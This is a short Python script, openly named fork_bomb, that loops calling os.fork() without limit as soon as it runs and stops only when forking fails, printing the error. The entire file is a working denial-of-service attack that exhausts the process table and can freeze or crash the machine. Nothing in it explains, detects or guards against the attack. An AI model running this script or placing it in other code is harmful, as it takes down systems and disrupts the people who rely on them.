import os
import time
import sys

def fork_bomb():
    while True:
        try:
            os.fork()
        except OSError as e:
            print(f"Fork failed: {e}")
            sys.stdout.flush()  # Flush the output buffer immediately
            break  # Exit the loop if forking fails

if __name__ == "__main__":
    fork_bomb()
    time.sleep(1)  # Keep the script running to observe behavior
